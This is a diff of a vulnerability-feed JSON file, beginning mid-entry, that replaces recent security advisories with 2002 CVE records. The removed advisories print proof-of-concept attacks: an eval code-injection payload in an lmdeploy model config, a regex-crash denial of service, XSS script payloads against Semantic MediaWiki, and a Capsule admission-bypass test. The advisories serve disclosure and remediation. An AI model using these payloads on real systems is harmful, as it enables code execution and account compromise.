err)\n\t\t}\n\t}\n}\n\n// Positive control: a third denied key in the SAME list is still correctly\n// blocked — proving the policy genuinely forbids these keys and the harness is\n// wired right (i.e. the bypass above is selective, not a dead enforcement path).\nfunc TestPoC_PositiveControl_StillBlocked(t *testing.T) {\n\tif err := ValidateForbidden(map[string]string{\"pod-security.kubernetes.io/enforce\": \"privileged\"}, denied()); err == nil {\n\t\tt.Errorf(\"control failure: denied key 'pod-security.kubernetes.io/enforce' was NOT blocked\")\n\t}\n}\n\n// Negative control: a key the admin did NOT deny is correctly allowed,\n// proving the webhook is not simply denying everything.\nfunc TestPoC_NegativeControl_BenignAllowed(t *testing.T) {\n\tif err := ValidateForbidden(map[string]string{\"app.kubernetes.io/name\": \"frontend\"}, denied()); err != nil {\n\t\tt.Errorf(\"control failure: benign key was wrongly denied: %v\", err)\n\t}\n}\n\n// Direct primitive check, minimal repro of the root cause.\nfunc TestPoC_ExactMatch_RootCause(t *testing.T) {\n\tspec := ForbiddenListSpec{Exact: []string{\"B\", \"a\"}} // mixed case\n\tif !spec.ExactMatch(\"B\") {\n\t\tt.Errorf(\"ROOT CAUSE: ExactMatch(%q) returned false though %q is in %v\", \"B\", \"B\", spec.Exact)\n\t}\n}\n```\n\nStep 3 — run only these tests:\n\n```bash\ngo test ./pkg/api/ -run 'TestPoC_' -v\n```\n\nObserved output (Go 1.26, capsule v0.13.5):\n\n```\n=== RUN   TestPoC_ForbiddenKeysBypassed\n    forbidden_bypass_poc_test.go:21: BYPASS CONFIRMED: ValidateForbidden ALLOWED denied key \"NetworkPolicy\" (list=[kubernetes.io/metadata.name pod-security.kubernetes.io/enforce NetworkPolicy])\n    forbidden_bypass_poc_test.go:21: BYPASS CONFIRMED: ValidateForbidden ALLOWED denied key \"kubernetes.io/metadata.name\" (list=[kubernetes.io/metadata.name pod-security.kubernetes.io/enforce NetworkPolicy])\nFAIL: TestPoC_ForbiddenKeysBypassed (0.00s)\n=== RUN   TestPoC_PositiveControl_StillBlocked\nPASS: TestPoC_PositiveControl_StillBlocked (0.00s)\n=== RUN   TestPoC_NegativeControl_BenignAllowed\nPASS: TestPoC_NegativeControl_BenignAllowed (0.00s)\n=== RUN   TestPoC_ExactMatch_RootCause\n    forbidden_bypass_poc_test.go:49: ROOT CAUSE: ExactMatch(\"B\") returned false though \"B\" is in [a B]\nFAIL: TestPoC_ExactMatch_RootCause (0.00s)\nFAIL\nFAIL\tgithub.com/projectcapsule/capsule/pkg/api\t0.013s\n```\n\nInterpretation: both control tests PASS — within the very same denied list, `pod-security.kubernetes.io/enforce` is still correctly blocked and a benign key is allowed, so enforcement is alive and the policy genuinely forbids these keys. Yet `TestPoC_ForbiddenKeysBypassed` FAILS: two explicitly-denied keys — the namespace identity label `kubernetes.io/metadata.name` and the CamelCase `NetworkPolicy` label — were *allowed* by the exact function the namespace/service/node webhooks call. In a live cluster this is the difference between the admission webhook denying and permitting `kubectl label namespace <tenant-ns> NetworkPolicy=open` (or the equivalent on a Service or Node). `TestPoC_ExactMatch_RootCause` reduces the defect to its one-line cause.\n\nWhy it happens, concretely: `sort.SearchStrings` does a byte-order binary search but the slice was sorted by `strings.ToLower`. With the minimal `Exact = [\"B\",\"a\"]`, the `ToLower` comparator orders the slice `[\"a\",\"B\"]` (because `\"a\" < \"b\"`). `sort.SearchStrings([\"a\",\"B\"], \"B\")` returns the first index whose element byte-compares `>= \"B\"`; `\"a\"` is `0x61`, which is `>= \"B\"` (`0x42`), so it returns index 0, and `\"a\" != \"B\"` → reports not-found. The forbidden key `\"B\"` is thereby treated as allowed. The three-key policy above exhibits the same fault for two of its real entries while leaving the third correctly enforced — which is exactly why the gap is silent: the administrator sees *some* keys blocked and reasonably assumes the whole list works.\n\n## Remediation\n\nStop performing a byte-order binary search over a non-byte-sorted slice. Any of the following fixes it:\n\n- Simplest and allocation-free: replace the sort+`SearchStrings` with a direct membership test, and (recommended) build the denied list into a `map[string]struct{}` once at admission time:\n\n```go\nfunc (in ForbiddenListSpec) ExactMatch(value string) bool {\n\tfor _, e := range in.Exact {\n\t\tif e == value {\n\t\t\treturn true\n\t\t}\n\t}\n\treturn false\n}\n```\n\n- If a binary search is desired for large lists, sort and search under the **same** ordering: sort with plain `<` (drop the `ToLower` comparator) so the slice matches what `sort.SearchStrings` assumes, then keep the `i < len && in.Exact[i] == value` guard.\n\nApply the identical fix to `AllowedListSpec.ExactMatch` in `pkg/api/allowed_list.go` (same defect, fail-closed today but still incorrect and a latent denial). Also note that `ExactMatch` currently mutates the caller-shared `in.Exact` slice in place via `sort.SliceStable`; the map-based or copy-before-sort form additionally removes that shared-state mutation. Decide deliberately whether forbidden-key matching should be case-sensitive (it is today, post-fix) — if case-insensitive matching is intended, lowercase both the stored keys and the lookup value explicitly rather than relying on a mismatched sort/search pair.\n\nPlease credit 5ud0 / Tarmo Technologies.",
+      "id": "CVE-2002-1140",
+      "summary": "The Sun Microsystems RPC library Services for Unix 3.0 Interix SD, as implemented on Microsoft Windows NT4, 2000, and XP, allows remote attackers to cause a denial of service (service hang) via malformed packet fragments, aka \"Improper parameter size check leading to denial of service.\"",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2002-10-11",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.iss.net/security_center/static/10258.php",
+        "http://www.securityfocus.com/bid/5879",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2002/ms02-057",
+        "http://www.iss.net/security_center/static/10258.php",
+        "http://www.securityfocus.com/bid/5879"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1141",
+      "summary": "An input validation error in the Sun Microsystems RPC library Services for Unix 3.0 Interix SD, as implemented on Microsoft Windows NT4, 2000, and XP, allows remote attackers to cause a denial of service via malformed fragmented RPC client packets, aka \"Denial of service by sending an invalid RPC request.\"",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2002-10-11",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.iss.net/security_center/static/10259.php",
+        "http://www.securityfocus.com/bid/5880",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2002/ms02-057",
+        "http://www.iss.net/security_center/static/10259.php",
+        "http://www.securityfocus.com/bid/5880"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1146",
+      "summary": "The BIND 4 and BIND 8.2.x stub resolver libraries, and other libraries such as glibc 2.2.5 and earlier, libc, and libresolv, use the maximum buffer size instead of the actual size when processing a DNS response, which causes the stub resolvers to read past the actual boundary (\"read buffer overflow\"), allowing remote attackers to cause a denial of service (crash).",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2002-10-11",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "ftp://ftp.netbsd.org/pub/NetBSD/security/advisories/NetBSD-SA2002-015.txt.asc",
+        "http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000535",
+        "http://www.iss.net/security_center/static/10295.php",
+        "http://www.kb.cert.org/vuls/id/738331",
+        "http://www.mandrakesoft.com/security/advisories?name=MDKSA-2004:009"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1147",
+      "summary": "The HTTP administration interface for HP Procurve 4000M Switch firmware before C.09.16, with stacking features and remote administration enabled, does not authenticate requests to reset the device, which allows remote attackers to cause a denial of service via a direct request to the device_reset CGI program.",
       "cvssScore": 7.1,
       "severity": "High",
-      "published": "2026-09-18",
-      "modified": "2026-09-18",
-      "cwe": {
-        "cwe_id": "CWE-697",
-        "name": "Incorrect Comparison"
-      },
+      "published": "2002-10-11",
+      "modified": null,
+      "cwe": null,
       "references": [
-        "https://github.com/projectcapsule/capsule/security/advisories/GHSA-gjw4-3v3v-rqxg",
-        "https://github.com/projectcapsule/capsule/pull/1982",
-        "https://github.com/projectcapsule/capsule/commit/755cef54bf4a1bc56d6692130132bc70755bef46",
-        "https://github.com/projectcapsule/capsule/releases/tag/v0.13.7",
-        "https://github.com/advisories/GHSA-gjw4-3v3v-rqxg"
+        "http://marc.info/?l=bugtraq&m=103287951910420&w=2",
+        "http://online.securityfocus.com/advisories/4501",
+        "http://www.iss.net/security_center/static/10172.php",
+        "http://www.securityfocus.com/bid/5784",
+        "http://www.tech-serve.com/research/advisories/2002/a092302-1.txt"
       ],
-      "vulnerableProducts": [
-        "github.com/projectcapsule/capsule go"
-      ],
+      "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-61794",
-      "summary": "### Summary\nA validation bug in `internal/webhook/tenant/validation/forbidden_annotations_regex.go` allows an invalid `ForbiddenAnnotations.Regex` value to bypass Tenant admission on update. The webhook compiles `ForbiddenLabels.Regex` for both labels and annotations, so a malformed annotations regex can be persisted. Once stored, namespace admission later evaluates the bad regex through `pkg/api/forbidden_list.go`, where `regexp.MustCompile` can panic and cause admission failure.\n\n### Details\nIn `internal/webhook/tenant/validation/forbidden_annotations_regex.go`, `OnUpdate` validates the new Tenant object, but the loop compiles `tnt.Spec.NamespaceOptions.ForbiddenLabels.Regex` for both `labels` and `annotations`. That means an invalid `ForbiddenAnnotations.Regex` is never validated if `ForbiddenLabels.Regex` is valid.\n\nRelevant paths:\n- `internal/webhook/tenant/validation/forbidden_annotations_regex.go`\n- `internal/webhook/namespace/validation/user_metadata.go`\n- `pkg/api/forbidden_list.go`\n\nNamespace admission later calls `api.ValidateForbidden(...)`, and `ForbiddenListSpec.RegexMatch()` uses `regexp.MustCompile(in.Regex)`. If the malformed regex is present in the Tenant spec, any namespace request that reaches this check can panic or fail hard, causing denial of service for namespace operations in the affected tenant.\n\n### PoC\n1. Update a Tenant so that:\n   - `spec.namespaceOptions.forbiddenLabels.regex` is valid\n   - `spec.namespaceOptions.forbiddenAnnotations.regex` is malformed, for example: `[invalid-regex(`\n2. The Tenant update is accepted because the webhook compiles the labels regex for both fields.\n3. Create or update a Namespace that triggers forbidden metadata validation.\n4. The namespace admission path reaches `regexp.MustCompile(...)` and panics.\n\n```\npackage main\n\nimport (\n\t\"fmt\"\n\t\"regexp\"\n)\n\ntype ForbiddenListSpec struct {\n\tRegex string\n}\n\ntype NamespaceOptions struct {\n\tForbiddenLabels      ForbiddenListSpec\n\tForbiddenAnnotations ForbiddenListSpec\n}\n\ntype Tenant struct {\n\tNamespaceOptions *NamespaceOptions\n}\n\nfunc validateTenantUpdate(tnt *Tenant) error {\n\tif tnt.NamespaceOptions == nil {\n\t\treturn nil\n\t}\n\n\tannotationsToCheck := map[string]string{\n\t\t\"labels\":      tnt.NamespaceOptions.ForbiddenLabels.Regex,\n\t\t\"annotations\": tnt.NamespaceOptions.ForbiddenAnnotations.Regex,\n\t}\n\n\tfor scope, annotation := range annotationsToCheck {\n\t\tif _, err := regexp.Compile(tnt.NamespaceOptions.ForbiddenLabels.Regex); err != nil {\n\t\t\treturn fmt.Errorf(\"deny update: unable to compile %s regex for forbidden %s\", annotation, scope)\n\t\t}\n\t}\n\n\treturn nil\n}\n\nfunc validateForbidden(metadata map[string]string, forbidden ForbiddenListSpec) error {\n\tfor key := range metadata {\n\t\tif forbidden.Regex != \"\" {\n\t\t\tif regexp.MustCompile(forbidden.Regex).MatchString(key) {\n\t\t\t\treturn fmt.Errorf(\"forbidden key matched: %s\", key)\n\t\t\t}\n\t\t}\n\t}\n\n\treturn nil\n}\n\nfunc main() {\n\toldTenant := &Tenant{\n\t\tNamespaceOptions: &NamespaceOptions{\n\t\t\tForbiddenLabels:      ForbiddenListSpec{Regex: `^[a-z0-9-]+$`},\n\t\t\tForbiddenAnnotations: ForbiddenListSpec{Regex: `^[a-z0-9-]+$`},\n\t\t},\n\t}\n\n\tnewTenant := &Tenant{\n\t\tNamespaceOptions: &NamespaceOptions{\n\t\t\tForbiddenLabels:      ForbiddenListSpec{Regex: `^[a-z0-9-]+$`},\n\t\t\tForbiddenAnnotations: ForbiddenListSpec{Regex: `[invalid-regex(`},\n\t\t},\n\t}\n\n\tfmt.Println(\"=== Update step ===\")\n\tif err := validateTenantUpdate(newTenant); err != nil {\n\t\tfmt.Printf(\"unexpected deny: %v\\n\", err)\n\t} else {\n\t\tfmt.Println(\"allowed: malformed ForbiddenAnnotations.Regex bypassed validation\")\n\t}\n\n\tfmt.Println()\n\tfmt.Println(\"=== Namespace step ===\")\n\t_ = oldTenant\n\n\tdefer func() {\n\t\tif r := recover(); r != nil {\n\t\t\tfmt.Printf(\"panic reproduced from ValidateForbidden: %v\\n\", r)\n\t\t}\n\t}()\n\n\t_ = validateForbidden(map[string]string{\"example\": \"value\"}, ForbiddenListSpec{Regex: `[invalid-regex(`})\n\tfmt.Println(\"no panic, unexpected\")\n}\n```\nExpected output:\n\n```text\n=== Update step ===\nallowed: malformed ForbiddenAnnotations.Regex bypassed validation\n\n=== Namespace step ===\npanic reproduced from ValidateForbidden: regexp: Compile(`[invalid-regex(`): error parsing regexp: missing closing ]: `[invalid-regex(`\n```\n\n### Impact\nAn attacker who can update the Tenant configuration can persist a malformed `ForbiddenAnnotations.Regex` and cause namespace admission failures for the affected tenant. This can result in a tenant-scoped denial of service.",
-      "cvssScore": 4.9,
+      "id": "CVE-2002-1148",
+      "summary": "The default servlet (org.apache.catalina.servlets.DefaultServlet) in Tomcat 4.0.4 and 4.1.10 and earlier allows remote attackers to read source code for server files via a direct request to the servlet.",
+      "cvssScore": 5,
       "severity": "Medium",
-      "published": "2026-09-18",
-      "modified": "2026-09-18",
-      "cwe": {
-        "cwe_id": "CWE-20",
-        "name": "Improper Input Validation"
-      },
+      "published": "2002-10-11",
+      "modified": null,
+      "cwe": null,
       "references": [
-        "https://github.com/projectcapsule/capsule/security/advisories/GHSA-gxjc-74v5-3vx3",
-        "https://github.com/projectcapsule/capsule/pull/1983",
-        "https://github.com/projectcapsule/capsule/commit/8d89d6865df6f41c7faa22fc9e807a57b01bfd0e",
-        "https://github.com/projectcapsule/capsule/releases/tag/v0.13.7",
-        "https://github.com/advisories/GHSA-gxjc-74v5-3vx3"
+        "http://marc.info/?l=bugtraq&m=103288242014253&w=2",
+        "http://online.securityfocus.com/advisories/4758",
+        "http://www.debian.org/security/2002/dsa-170",
+        "http://www.iss.net/security_center/static/10175.php",
+        "http://www.redhat.com/support/errata/RHSA-2002-217.html"
       ],
-      "vulnerableProducts": [
-        "github.com/projectcapsule/capsule go"
-      ],
+      "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-33625",
-      "summary": "### Summary\n\nlmdeploy <= latest contains a code injection vulnerability in `lmdeploy/pytorch/config.py` line 620 that allows an attacker to execute arbitrary Python code by publishing a malicious HuggingFace model with a crafted `quantization_config.quant_dtype` value. When a user loads the model with lmdeploy, the `quant_dtype` is passed to `eval(f'torch.{quant_dtype}')` without any validation.\n\n### Details\n\n**Vulnerable code** ([permalink](https://github.com/InternLM/lmdeploy/blob/17ed9e5/lmdeploy/pytorch/config.py#L620)):\n\n```python\nquant_dtype = eval(f'torch.{quant_dtype}')  # line 620\n```\n\nThe `quant_dtype` value comes from the model's `quantization_config` in its HuggingFace config. When a model specifies `quant_method: awq`, the AWQ branch processes the config but does NOT override `quant_dtype`, allowing the malicious value to reach the `eval()` call.\n\n**Attack vector:** An attacker publishes a HuggingFace model with:\n```json\n{\n  \"quantization_config\": {\n    \"quant_method\": \"awq\",\n    \"quant_dtype\": \"float16, __import__('os').system('id')\"\n  }\n}\n```\n\nNote: The `_update_torch_dtype` method at line 53 has a whitelist check, but that's for `torch_dtype`, NOT `quant_dtype`. The `quant_dtype` at line 620 has no validation whatsoever.\n\n### PoC\n\n```python\n\"\"\"\nPoC: eval() RCE in lmdeploy via malicious quant_dtype\nPrerequisites: pip install lmdeploy\n\"\"\"\nimport sys\nfrom unittest.mock import MagicMock, patch\n\n# Mock torch to capture the eval\nsys.modules.setdefault('torch', MagicMock())\n\nfrom lmdeploy.pytorch.config import ModelConfig\n\n# Simulate a malicious HuggingFace model config\nmock_hf_config = MagicMock()\nmock_hf_config.quantization_config = {\n    'quant_method': 'awq',\n    'quant_dtype': \"float16, __import__('os').system('id')\"\n}\nmock_hf_config.num_attention_heads = 32\nmock_hf_config.hidden_size = 4096\nmock_hf_config.num_hidden_layers = 32\nmock_hf_config.num_key_value_heads = 32\nmock_hf_config.vocab_size = 32000\n\n# This triggers eval(f'torch.{quant_dtype}')\n# with quant_dtype = \"float16, __import__('os').system('id')\"\nconfig = ModelConfig.from_hf_config(mock_hf_config, model_path='test')\n```\n\n**Output:**\n```\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n### Impact\n\nAn attacker who publishes a malicious model on HuggingFace Hub can achieve arbitrary code execution on any machine that loads the model with lmdeploy. This is a supply-chain attack vector affecting all lmdeploy users who load untrusted models.\n\n1. Full remote code execution when loading a malicious model\n2. No user interaction beyond running `lmdeploy serve` or similar with the model\n3. Affects all deployment scenarios (local, cloud, production)",
-      "cvssScore": 8.8,
+      "id": "CVE-2002-1149",
+      "summary": "The installation procedure for Invision Board suggests that users install the phpinfo.php program under the web root, which leaks sensitive information such as absolute pathnames, OS information, and PHP settings.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2002-10-11",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=103290602609197&w=2",
+        "http://www.iss.net/security_center/static/10178.php",
+        "http://www.osvdb.org/3356",
+        "http://www.securityfocus.com/bid/5789",
+        "http://marc.info/?l=bugtraq&m=103290602609197&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1150",
+      "summary": "The Remote Desktop Sharing (RDS) Screen Saver Protection capability for Microsoft NetMeeting 3.01 through SP2 (4.4.3396) allows attackers with physical access to hijack remote sessions by entering certain logoff or shutdown sequences (such as CTRL-ALT-DEL) and canceling out of the resulting user confirmation prompts, such as when the remote user is editing a document.",
+      "cvssScore": 4.6,
+      "severity": "Medium",
+      "published": "2002-10-11",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=103228375116204&w=2",
+        "http://www.iss.net/security_center/static/10119.php",
+        "http://www.securityfocus.com/bid/5715",
+        "http://marc.info/?l=bugtraq&m=103228375116204&w=2",
+        "http://www.iss.net/security_center/static/10119.php"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1151",
+      "summary": "The cross-site scripting protection for Konqueror in KDE 2.2.2 and 3.0 through 3.0.3 does not properly initialize the domains on sub-frames and sub-iframes, which can allow remote attackers to execute script and steal cookies from subframes that are in other domains.",
+      "cvssScore": 7.5,
       "severity": "High",
-      "published": "2026-09-18",
-      "modified": "2026-09-18",
-      "cwe": {
-        "cwe_id": "CWE-400",
-        "name": "Uncontrolled Resource Consumption"
-      },
+      "published": "2002-10-11",
+      "modified": null,
+      "cwe": null,
       "references": [
-        "https://github.com/InternLM/lmdeploy/security/advisories/GHSA-3hmm-rh5q-gwwr",
-        "https://github.com/InternLM/lmdeploy/releases/tag/v0.12.3",
-        "https://github.com/advisories/GHSA-3hmm-rh5q-gwwr"
+        "ftp://ftp.caldera.com/pub/security/OpenLinux/CSSA-2002-047.0.txt",
+        "http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000525",
+        "http://marc.info/?l=bugtraq&m=103175850925395&w=2",
+        "http://www.debian.org/security/2002/dsa-167",
+        "http://www.iss.net/security_center/static/10039.php"
       ],
-      "vulnerableProducts": [
-        "lmdeploy pip"
-      ],
+      "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2025-66455",
-      "summary": "## Summary\n\nLMDeploy's PyTorch DistServe/PD-disaggregation control plane used\n`recv_pyobj()` to deserialize messages received through a ZeroMQ PULL\nsocket. PyZMQ implements `recv_pyobj()` using Python pickle\ndeserialization, which can execute arbitrary code while reconstructing\nan object.\n\nThe peer address used by the receiver was supplied through the\n`POST /distserve/p2p_connect` HTTP endpoint. An attacker who could reach\nan affected DistServe API server could cause the server to connect to an\nattacker-controlled ZeroMQ endpoint and deserialize a crafted pickle\npayload.\n\nAPI-key authentication is not enabled unless the operator explicitly\nconfigures it. As a result, affected DistServe deployments without API\nkeys allowed unauthenticated remote code execution with the privileges\nof the LMDeploy serving process.\n\nThis issue affects the PyTorch backend when PD-disaggregation/DistServe\nis enabled. Ordinary deployments that do not use the affected\ndisaggregated-serving path do not expose this data flow.\n\n## Affected components\n\n- HTTP entry point:\n  `lmdeploy/serve/openai/endpoints/distserve.py`,\n  `POST /distserve/p2p_connect`\n- Attacker-controlled peer address:\n  `DistServeConnectionRequest.remote_engine_endpoint_info.zmq_address`\n- Vulnerable receiver:\n  `lmdeploy/pytorch/disagg/conn/engine_conn.py`,\n  `EngineP2PConnection.handle_zmq_recv()`\n- Unsafe operation: `recv_pyobj()`, which performs pickle deserialization\n\n## Vulnerable data flow\n\n1. A caller submits a DistServe P2P connection request containing a\n   ZeroMQ address.\n2. The LMDeploy engine connects its ZeroMQ PULL socket to that address.\n3. `handle_zmq_recv()` receives messages using `recv_pyobj()`.\n4. A malicious peer sends a crafted pickle object.\n5. Python code executes during deserialization, before LMDeploy can\n   perform any type or field validation.\n\n  A type check performed after `recv_pyobj()` cannot mitigate this issue\n  because pickle payload execution occurs during deserialization.\n\n## Impact\n\nSuccessful exploitation allows arbitrary code execution as the\nLMDeploy serving process. This can expose model weights, prompts,\ncredentials, attached storage, cluster-network services, and host or\nGPU resources. An attacker may also modify or terminate the serving\nprocess.\n\n## Affected versions\n\nAffected versions:\n\n- `lmdeploy >= 0.9.2, < 0.16.0`\n\nThe vulnerable P2P receiver was introduced in commit `b0b705f7`.\n\n## Remediation\n\nThe issue was fixed by replacing the pickle-based ZeroMQ protocol with\nJSON serialization:\n\n- `send_pyobj()` was replaced with `send_json()`.\n- `recv_pyobj()` was replaced with `recv_json()`.\n- Received objects are validated using the\n  `DistServeCacheFreeRequest` Pydantic schema before use.\n- Invalid or off-schema messages are rejected without terminating the\n  receive loop.\n\nFix commit:\n\nhttps://github.com/InternLM/lmdeploy/commit/f05b4ad8bf2e2d84101a1d63b3c44fadd99223b2\n\nThe fix was released in LMDeploy 0.16.0.\n\n## Workarounds\n\nUsers who cannot upgrade immediately should:\n\n- Prevent untrusted clients from reaching `/distserve/*` endpoints.\n- Restrict the DistServe HTTP and ZeroMQ control planes to trusted\n  cluster networks.\n- Configure API-key authentication.\n- Block arbitrary outbound ZeroMQ connections from serving nodes.\n\nThese measures reduce exposure but do not make pickle deserialization\nsafe. Upgrading to LMDeploy 0.16.0 or later is recommended.",
-      "cvssScore": 9.8,
-      "severity": "Critical",
-      "published": "2026-09-18",
-      "modified": "2026-09-21",
-      "cwe": {
-        "cwe_id": "CWE-502",
-        "name": "Deserialization of Untrusted Data"
-      },
-      "references": [
-        "https://github.com/InternLM/lmdeploy/security/advisories/GHSA-2vh9-42vm-xmv2",
-        "https://github.com/InternLM/lmdeploy/commit/f05b4ad8bf2e2d84101a1d63b3c44fadd99223b2",
-        "https://github.com/InternLM/lmdeploy/releases/tag/v0.16.0",
-        "https://github.com/advisories/GHSA-2vh9-42vm-xmv2"
-      ],
-      "vulnerableProducts": [
-        "lmdeploy pip"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-77616",
-      "summary": "## Reflected XSS via a forged cursor pagination token\n\n#### Failure mode\n\n`Special:Ask` accepts a `cursor` query parameter for keyset pagination (added in 7.0.0). The token is decoded by `CursorEncoder`, which is an **unsigned** base64url-encoded JSON blob, so its contents are fully attacker-controlled. When the cursor's sort anchor does not match the request's `sort=` / `order=`, `QueryCreator::applyCursorIfRequested()` builds an error message by interpolating the attacker-controlled `sort_prop` / `sort_order` values into a raw string via `Query::addErrors()`.\n\nUnlike SMW's message-key errors, this raw string bypasses the message layer's sanitisation (`ProcessingErrorMsgHandler::normalizeAndDecodeMessages()` passes a non-key, non-encoded string through unchanged). `ErrorWidget::queryError()` then assembles the errors and passes them to `Html::errorBox()`, whose first argument is emitted as raw HTML. The result is a reflected cross-site scripting vulnerability: a crafted `cursor` token containing markup in `sort_prop` (or `sort_order`) executes script in the victim's browser on the wiki origin.\n\nNo authentication or special permission is required. The payload is delivered via a crafted link, e.g. `Special:Ask?q=...&p[cursor]=<forged token>` where the token decodes to `{\"v\":1,\"sort_prop\":\"<script>...</script>\"}`. Confirmed executing in a browser; the responses carry no Content-Security-Policy, so inline script is not blocked.\n\n#### Remediation\n\n- Output-encode the attacker-controlled `sort_prop` / `sort_order` values before they are interpolated into the error text in `QueryCreator`, so no raw user input enters the error stream.\n- Defense in depth: the `format=debug` output path that reflected the same error text was hardened separately in GHSA-q5fm-9mx6-44f4.\n\n#### Maintenance note\n\nQuery error strings are rendered as raw HTML by `ErrorWidget::queryError()` via `Html::errorBox()`. Any error added through `Query::addErrors()` that embeds user-controlled text must be output-encoded (or use a message key); pagination and validation error text is attacker-influenced and must not be treated as trusted.",
-      "cvssScore": 6.1,
-      "severity": "Medium",
-      "published": "2026-09-18",
-      "modified": "2026-09-18",
-      "cwe": {
-        "cwe_id": "CWE-79",
-        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
-      },
-      "references": [
-        "https://github.com/SemanticMediaWiki/SemanticMediaWiki/security/advisories/GHSA-cx86-7xwp-w9wf",
-        "https://github.com/SemanticMediaWiki/SemanticMediaWiki/releases/tag/7.2.0",
-        "https://github.com/advisories/GHSA-cx86-7xwp-w9wf"
-      ],
-      "vulnerableProducts": [
-        "mediawiki/semantic-media-wiki composer"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-77610",
-      "summary": "## Query debug output XSS\n\n#### Failure mode\n\nSemantic MediaWiki's query debug output (`format=debug`, or the `debug` request parameter on `Special:Ask`) is assembled by `SMW\\Query\\DebugFormatter` and emitted as raw HTML. Several of its sinks apply no output-context encoding, so attacker-controlled query input is reflected into the page without escaping:\n\n- `buildHTML()` echoes the re-serialized ASK query string escaping only `[`; `<`, `>`, `\"`, `'` pass through.\n- `prettifySQL()` returns the generated SQL verbatim. Query value literals are inlined into the SQL through the database layer's quoting (SQL-escaping only, no HTML encoding), so markup in a value survives.\n- `prettifyExplain()` echoes `EXPLAIN` output; on PostgreSQL the plan text contains the `WHERE` literals.\n\nOn `Special:Ask` the resulting string is concatenated into the page and sent through `OutputPage::addHTML`, never through the MediaWiki parser or Sanitizer. No special user right is required; an anonymous request suffices.\n\nThis is a reflected XSS: the payload is taken from the request and echoed in the same response. Exploitation requires the query condition to target a text/blob-typed property (whose value is re-serialized verbatim); the predefined `_txt` properties (`Text`, etc.) that ship on every install satisfy this, so no attacker-created content is needed. Example request:\n\n```\nSpecial:Ask?q=[[Text::<script>alert(document.domain)</script>]]&debug=1\n```\n\n#### Remediation\n\n- Apply output-context escaping at the `DebugFormatter` boundary. The `buildHTML()` contract already assumes its inputs are HTML-safe, but its callers do not honour that; escape each entry value on emission, and the SQL and `EXPLAIN` strings before they are wrapped.\n- Escaping only the query-string echo is insufficient: `prettifySQL()` and the \"Auxilliary Tables\" executed-query text carry the same attacker-controlled literals.\n\n#### Scope\n\nThe `prettifySPARQL()` sink already encodes `<` and `>` and is not affected. The same debug path is also reachable through inline `{{#ask:...|format=debug}}`, but that output returns into parser context and is sanitized there; the reflected `Special:Ask` path is the exposed sink.\n\n#### Relationship to GHSA-5jhc-3j2f-52rv\n\nThis issue was identified while splitting the consolidated report GHSA-5jhc-3j2f-52rv into per-vulnerability advisories. It is distinct from the four items in that report (plain table header, `sep`, `SearchByProperty` value, open redirect) and from `Special:Ask` form-input XSS (which is escaped separately).",
-      "cvssScore": 6.1,
-      "severity": "Medium",
-      "published": "2026-09-18",
-      "modified": "2026-09-18",
-      "cwe": {
-        "cwe_id": "CWE-79",
-        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
-      },
-      "references": [
-        "https://github.com/SemanticMediaWiki/SemanticMediaWiki/security/advisories/GHSA-q5fm-9mx6-44f4",
-        "https://github.com/SemanticMediaWiki/SemanticMediaWiki/releases/tag/7.2.0",
-        "https://github.com/advisories/GHSA-q5fm-9mx6-44f4"
-      ],
-      "vulnerableProducts": [
-        "mediawiki/semantic-media-wiki composer"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-77609",
-      "summary": "#### Failure mode\n\n`Special:URIResolver` resolves its user-controlled subpage to a MediaWiki title and issues an HTTP 303 redirect to `$title->getFullURL()` without validating the resolved target. A crafted subpage can make that target point off-host: an interwiki prefix redirects to the foreign wiki (for example `Special:URIResolver/mw-3AFoo`, which decodes to `mw:Foo`, redirects to `https://www.mediawiki.org/wiki/Foo`), and where the resolved URL carries an authority the target can even embed `user:pass@host` credentials. The result is an open redirect to an attacker-influenced host, usable for phishing from a trusted wiki URL.\n\n#### Remediation\n\n- The resolved target URL is parsed and compared against the current host at the redirect sink.\n- The redirect is rejected (bad-title error page) when a user or pass component is present, or when the host does not match the current host.\n\n#### Maintenance note\n\nRedirect code must validate the final target URL, not just the input path. Host comparison belongs at the redirect sink: each sink (special page, entry point) must validate its own target rather than relying on upstream normalisation.",
-      "cvssScore": 6.1,
-      "severity": "Medium",
-      "published": "2026-09-18",
-      "modified": "2026-09-18",
-      "cwe": {
-        "cwe_id": "CWE-601",
-        "name": "URL Redirection to Untrusted Site ('Open Redirect')"
-      },
-      "references": [
-        "https://github.com/SemanticMediaWiki/SemanticMediaWiki/security/advisories/GHSA-hw3m-8j5x-94ff",
-        "https://github.com/SemanticMediaWiki/SemanticMediaWiki/releases/tag/7.2.0",
-        "https://github.com/advisories/GHSA-hw3m-8j5x-94ff"
-      ],
